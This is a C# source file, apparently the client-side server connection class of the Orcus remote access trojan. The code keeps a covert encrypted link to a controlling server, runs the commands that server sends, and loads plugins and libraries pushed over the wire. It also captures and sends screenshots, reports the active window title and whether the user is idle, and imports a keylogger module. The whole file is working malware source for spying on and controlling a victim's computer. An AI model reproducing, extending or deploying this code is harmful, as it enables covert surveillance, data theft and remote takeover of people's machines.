using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Orcus.CommandManagement;
using Orcus.Config;
using Orcus.Connection.Args;
using Orcus.Core;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Orcus.Shared.Utilities.Compression;
using Orcus.StaticCommandManagement;
using Orcus.Utilities;
using Orcus.Utilities.KeyLogger;

namespace Orcus.Connection
{
    public class ServerConnection : IServerConnection
    {
        private readonly IClientInfo _clientInfo;
        private readonly Func<byte> _readByteDelegate;
        private readonly SslStream _sslStream;
        private readonly Timer _onlineCheckTimer;
        private const int OnlineCheckInterval = 5 * 60 * 1000;

        public ServerConnection(TcpClient client, SslStream sslStream, BinaryReader reader, BinaryWriter writer,
            DatabaseConnection databaseConnection, IClientInfo clientInfo)
        {
            _sslStream = sslStream;
            _clientInfo = clientInfo;
            BinaryReader = reader;
            BinaryWriter = writer;
            TcpClient = client;
            AdministrationConnections = new List<AdministrationConnection>();

            _readByteDelegate += BinaryReader.ReadByte;
            _readByteDelegate.BeginInvoke(EndRead, null);

            SendLock = new object();
            IsConnected = true;

            databaseConnection.ServerConnection = this;

            try
            {
                SendCachedPackages();
            }
            catch (Exception ex)
            {
                ErrorReporter.Current.ReportError(ex, "Send Cached Packages");
            }

            _onlineCheckTimer = new Timer(OnlineCheckTimerCallback, null, OnlineCheckInterval, Timeout.Infinite);
        }

        public void Dispose()
        {
            Disconnected?.Invoke(this, EventArgs.Empty);
            BinaryReader.Close();
            BinaryWriter.Close();
            _sslStream.Dispose();
            TcpClient.Close();
            IsConnected = false;
        }

        private void OnlineCheckTimerCallback(object state)
        {
            if (IsConnected)
            {
                try
                {
                    lock (SendLock)
                    {
                        BinaryWriter.Write((byte)FromClientPackage.CheckStillAlive);
                        BinaryWriter.Write(0);
                    }
                }
                catch (Exception)
                {
                    Dispose();
                }
                _onlineCheckTimer.Change(OnlineCheckInterval, Timeout.Infinite);
            }
        }

        public List<AdministrationConnection> AdministrationConnections { get; }
        public bool IsConnected { get; private set; }
        public object SendLock { get; }
        public BinaryReader BinaryReader { get; }
        public BinaryWriter BinaryWriter { get; }
        public TcpClient TcpClient { get; }

        public event EventHandler Disconnected;
        public event EventHandler<FileTransferEventArgs> FileTransferAccepted;
        public event EventHandler<FileTransferEventArgs> FileTransferCompleted;
        public event EventHandler<StaticCommandPluginReceivedEventArgs> StaticCommandPluginReceived;

        public void SendServerPackage(ServerPackageType serverPackageType, byte[] data, bool redirectPackage,
            ushort administrationId)
        {
            var serverPackage = new ServerPackage
            {
                Data = data,
                ServerPackageType = serverPackageType,
                RedirectPackage = redirectPackage ? new RedirectPackage {Administration = administrationId} : null
            };

            var package = new Serializer(typeof (ServerPackage)).Serialize(serverPackage);

            lock (SendLock)
            {
                try
                {
                    BinaryWriter.Write((byte) FromClientPackage.ServerPackage);
                    BinaryWriter.Write(package.Length);
                    BinaryWriter.Write(package);
                    BinaryWriter.Flush();
                }
                catch (ObjectDisposedException)
                {
                }
            }
        }

        public void PushExceptions(byte[] exceptions)
        {
            lock (SendLock)
            {
                BinaryWriter.Write((byte) FromClientPackage.SubmitExceptions);
                var data = LZF.Compress(exceptions, 0);
                BinaryWriter.Write(data.Length);
                BinaryWriter.Write(data);
            }
        }

        public void InitializeFileTransfer(Guid guid)
        {
            lock (SendLock)
            {
                BinaryWriter.Write((byte) FromClientPackage.InitializePushFile);
                BinaryWriter.Write(16);
                BinaryWriter.Write(guid.ToByteArray());
            }
        }

        public void SendBytes(FromClientPackage token, byte[] package)
        {
            lock (SendLock)
            {
                BinaryWriter.Write((byte) token);
                BinaryWriter.Write(package.Length);
                BinaryWriter.Write(package);
                BinaryWriter.Flush();
            }
        }

        private void EndRead(IAsyncResult asyncResult)
        {
            try
            {
                var parameter = _readByteDelegate.EndInvoke(asyncResult);
                var size = BinaryReader.ReadInt32();

                switch ((FromAdministrationPackage) parameter)
                {
                    case FromAdministrationPackage.SendCommand:
                    case FromAdministrationPackage.SendCommandCompressed:
                        var bytes = BinaryReader.ReadBytes(size);
                        //don't execute in a thread because it wants to be synchronized
                        var administrationId = BitConverter.ToUInt16(bytes, 0);
                        var isCompressed = parameter == (byte) FromAdministrationPackage.SendCommandCompressed;
                        var packageData = isCompressed ? LZF.Decompress(bytes, 3) : bytes;

                        AdministrationConnections.FirstOrDefault(x => x.Id == administrationId)?
                            .PackageReceived(bytes[2], packageData, isCompressed ? 0 : 3);
                        break;
                    case FromAdministrationPackage.SendPlugin:
                        administrationId = BinaryReader.ReadUInt16();
                        var pluginLength = BinaryReader.ReadInt32();
                        var pluginGuid = new Guid(BinaryReader.ReadBytes(16));
                        var hash = BinaryReader.ReadBytes(16);
                        var versionData = BinaryReader.ReadBytes(BinaryReader.ReadInt32());
                        var version = Encoding.ASCII.GetString(versionData);

                        try
                        {
                            var pluginReceiver = new PluginReceiver(administrationId, pluginGuid, hash, version);

                            var buffer = new byte[8192];
                            int read;

                            while (pluginLength > 0 && (read = BinaryReader.Read(buffer, 0, Math.Min(buffer.Length, pluginLength))) > 0)
                            {
                                pluginReceiver.FileStream.Write(buffer, 0, read);
                                pluginLength -= read;
                            }

                            if (pluginReceiver.ImportPlugin() && LoadPlugin(pluginReceiver.Guid, PluginVersion.Parse(pluginReceiver.Version)))
                            {
                                lock (SendLock)
                                {
                                    BinaryWriter.Write((byte) FromClientPackage.PluginLoaded);
                                    BinaryWriter.Write(16 + versionData.Length);
                                    BinaryWriter.Write(pluginGuid.ToByteArray());
                                    BinaryWriter.Write(versionData);
                                }
                            }
                            else
                            {
                                lock (SendLock)
                                {
                                    BinaryWriter.Write((byte) FromClientPackage.PluginLoadFailed);
                                    BinaryWriter.Write(2 + 16 + versionData.Length);
                                    BinaryWriter.Write(BitConverter.GetBytes(pluginReceiver.AdministrationId));
                                    //administration id
                                    BinaryWriter.Write(pluginGuid.ToByteArray());
                                    BinaryWriter.Write(versionData);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            ErrorReporter.Current.ReportError(ex,
                                $"void ProcessResponse || Parameter: {(FromAdministrationPackage) parameter}, Size: {size} B");
                        }
                        break;
                    case FromAdministrationPackage.SendLibraries:
                        administrationId = BinaryReader.ReadUInt16();
                        try
                        {
                            var portableLibraries =
                                (List<PortableLibraryInfo>)
                                    new Serializer(typeof (List<PortableLibraryInfo>)).Deserialize(
                                        BinaryReader.BaseStream);

                            var loadedLibraries = PortableLibrary.None;
                            foreach (var portableLibraryInfo in portableLibraries)
                            {
                                try
                                {
                                    LibraryLoader.Current.LoadLibrary(portableLibraryInfo.Library, _sslStream,
                                        portableLibraryInfo.Length);
                                }
                                catch (Exception)
                                {
                                    continue;
                                }
                                loadedLibraries |= portableLibraryInfo.Library;
                            }

                            lock (SendLock)
                            {
                                BinaryWriter.Write((byte) FromClientPackage.ResponseLibraryLoadingResult);
                                BinaryWriter.Write(2 + 4);
                                BinaryWriter.Write(BitConverter.GetBytes(administrationId));
                                BinaryWriter.Write(BitConverter.GetBytes((int) loadedLibraries));
                            }
                        }
                        catch (Exception ex)
                        {
                            ErrorReporter.Current.ReportError(ex,
                                $"void ProcessResponse || Parameter: {(FromAdministrationPackage) parameter}, Size: {size} B");
                        }
                        break;
                    default:
                        bytes = BinaryReader.ReadBytes(size);
                        ThreadPool.QueueUserWorkItem(state =>
                        {
                            try
                            {
                                ProcessResponse(parameter, size, bytes);
                            }
                            catch (Exception ex)
                            {
                                ErrorReporter.Current.ReportError(ex,
                                    $"void ProcessResponse || Parameter: {(FromAdministrationPackage) parameter}, Size: {size} B");
                            }
                        });
                        break;
                }

                _readByteDelegate.BeginInvoke(EndRead, null);
            }
            catch (Exception)
            {
                Dispose();
            }
        }

        private void ProcessResponse(byte parameter, int size, byte[] bytes)
        {
            switch ((FromAdministrationPackage) parameter)
            {
                case FromAdministrationPackage.InitializeNewSession:
                    var id = BitConverter.ToUInt16(bytes, 0);
                    var connection = new AdministrationConnection(id, this, _clientInfo);
                    connection.SendFailed += (sender, args) => Dispose();

                    AdministrationConnections.Add(connection);
                    lock (SendLock)
                    {
                        BinaryWriter.Write((byte) FromClientPackage.ResponseLoginOpen);
                        BinaryWriter.Write(2);
                        BinaryWriter.Write(BitConverter.GetBytes(id));
                    }
                    break;
                case FromAdministrationPackage.SendStaticCommand:
                    var potentialCommand =
                        new Serializer(typeof(PotentialCommand)).Deserialize<PotentialCommand>(bytes, 0);

                    StaticCommandSelector.Current.ExecuteCommand(potentialCommand);
                    break;
                case FromAdministrationPackage.SendStaticCommandCompressed:
                    potentialCommand =
                        new Serializer(typeof (PotentialCommand)).Deserialize<PotentialCommand>(LZF.Decompress(bytes, 0), 0);

                    StaticCommandSelector.Current.ExecuteCommand(potentialCommand);
                    break;
                case FromAdministrationPackage.LoadPlugin:
                    var guid = new Guid(bytes.Skip(2).Take(16).ToArray());
                    var version = new Serializer(typeof (PluginVersion)).Deserialize<PluginVersion>(bytes,
                        18);
                    var versionData = Encoding.ASCII.GetBytes(version.ToString());
                    if (LoadPlugin(guid, version))
                    {
                        lock (SendLock)
                        {
                            BinaryWriter.Write((byte) FromClientPackage.PluginLoaded);
                            BinaryWriter.Write(16 + versionData.Length);
                            BinaryWriter.Write(guid.ToByteArray());
                            BinaryWriter.Write(versionData);
                        }
                    }
                    else
                    {
                        lock (SendLock)
                        {
                            BinaryWriter.Write((byte) FromClientPackage.PluginLoadFailed);
                            BinaryWriter.Write(2 + 16 + versionData.Length);
                            BinaryWriter.Write(bytes, 0, 2); //administration id
                            BinaryWriter.Write(guid.ToByteArray());
                            BinaryWriter.Write(versionData);
                        }
                    }
                    break;
                case FromAdministrationPackage.CloseSession:
                    var closingSessionId = BitConverter.ToUInt16(bytes, 0);
                    var session = AdministrationConnections.FirstOrDefault(x => x.Id == closingSessionId);
                    if (session != null)
                    {
                        AdministrationConnections.Remove(session);
                        session.Dispose();
                    }
                    break;
                case FromAdministrationPackage.GetActiveWindow:
                    try
                    {
                        string windowTitle = "";

                        var lastInPut = new LASTINPUTINFO();
                        lastInPut.cbSize = (uint) Marshal.SizeOf(lastInPut);

                        //15 min
                        if (NativeMethods.GetLastInputInfo(ref lastInPut) &&
                            (uint) Environment.TickCount - lastInPut.dwTime > 900000)
                        {
                            windowTitle += "[Idle] ";
                        }

                        windowTitle += ActiveWindowHook.GetActiveWindowTitle() ?? "";
                        var windowTitleData = Encoding.UTF8.GetBytes(windowTitle);
                        lock (SendLock)
                        {
                            BinaryWriter.Write((byte) FromClientPackage.ResponseActiveWindow);
                            BinaryWriter.Write(windowTitleData.Length + 2);
                            BinaryWriter.Write(bytes);
                            BinaryWriter.Write(windowTitleData);
                        }
                    }
                    catch (Exception ex)
                    {
                        ErrorReporter.Current.ReportError(ex,
                            "case FromAdministrationPackage.GetActiveWindow");
                    }
                    break;
                case FromAdministrationPackage.GetScreen:
                    try
                    {
                        using (var compressor = new JpgCompression(75))
                        {
                            byte[] screenshotData;
                            using (var memoryStream = new MemoryStream())
                            using (var screenshot = ScreenHelper.TakeScreenshot())
                            {
                                compressor.Compress(screenshot, memoryStream);
                                screenshotData = memoryStream.ToArray();
                            }

                            lock (SendLock)
                            {
                                BinaryWriter.Write((byte) FromClientPackage.ResponseScreenshot);
                                BinaryWriter.Write(screenshotData.Length + 2);
                                BinaryWriter.Write(bytes);
                                BinaryWriter.Write(screenshotData);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        ErrorReporter.Current.ReportError(ex, "case FromAdministrationPackage.GetScreen");
                    }
                    break;
                case FromAdministrationPackage.AcceptPush:
                    FileTransferAccepted?.Invoke(this, new FileTransferEventArgs(new Guid(bytes)));
                    break;
                case FromAdministrationPackage.TransferCompleted:
                    FileTransferCompleted?.Invoke(this, new FileTransferEventArgs(new Guid(bytes)));
                    break;
                case FromAdministrationPackage.IsAlive:
                    lock (SendLock)
                    {
                        BinaryWriter.Write((byte) FromClientPackage.StillAlive);
                        BinaryWriter.Write(0);
                    }
                    break;
                case FromAdministrationPackage.SendStaticCommandPlugin:
                    var pluginDirectory = new DirectoryInfo(Consts.StaticCommandPluginsDirectory);
                    if (!pluginDirectory.Exists)
                        pluginDirectory.Create();

                    var filename = FileExtensions.GetUniqueFileName(pluginDirectory.FullName);
                    using (var fileStream = new FileStream(filename, FileMode.CreateNew, FileAccess.Write))
                        fileStream.Write(bytes, 4, bytes.Length - 4);

                    StaticCommandPluginReceived?.Invoke(this, new StaticCommandPluginReceivedEventArgs(filename,
                        BitConverter.ToInt32(bytes, 0)));
                    break;
                case FromAdministrationPackage.RequestLibraryInformation:
                    var libraries = (PortableLibrary) BitConverter.ToInt32(bytes, 2);
                    var libraryHashes = (size - 6)/16;
                    var hashes = new List<byte[]>(libraryHashes);
                    for (int i = 0; i < libraryHashes; i++)
                    {
                        var hash = new byte[16];
                        Buffer.BlockCopy(bytes, 6 + i*16, hash, 0, 16);
                        hashes.Add(hash);
                    }
                    var result = LibraryLoader.Current.CheckLibraries(libraries, hashes);
                    lock (SendLock)
                    {
                        BinaryWriter.Write((byte) FromClientPackage.ResponseLibraryInformation);
                        BinaryWriter.Write(6);
                        BinaryWriter.Write(bytes, 0, 2); //administration id
                        BinaryWriter.Write(BitConverter.GetBytes((int) result));
                    }
                    break;
                case FromAdministrationPackage.StopActiveCommand:
                    StaticCommandSelector.Current.StopActiveCommand(BitConverter.ToInt32(bytes, 0));
                    break;
            }
        }

        private void SendCachedPackages()
        {
            var directory = new DirectoryInfo(Consts.SendToServerPackages);
            if (!directory.Exists)
                return;

            lock (SendLock)
            {
                foreach (var file in directory.GetFiles())
                {
                    BinaryWriter.Write(File.ReadAllBytes(file.FullName));
                    file.Delete();
                }
            }
        }

        private bool LoadPlugin(Guid guid, PluginVersion version)
        {
            var pluginFile = new FileInfo(Path.Combine(Consts.PluginsDirectory, $"{guid:N}_{version}"));
            if (pluginFile.Exists)
                try
                {
                    PluginLoader.Current.LoadPlugin(pluginFile.FullName, version);
                    return true;
                }
                catch (Exception)
                {
                    // ignored
                }

            return false;
        }
    }
}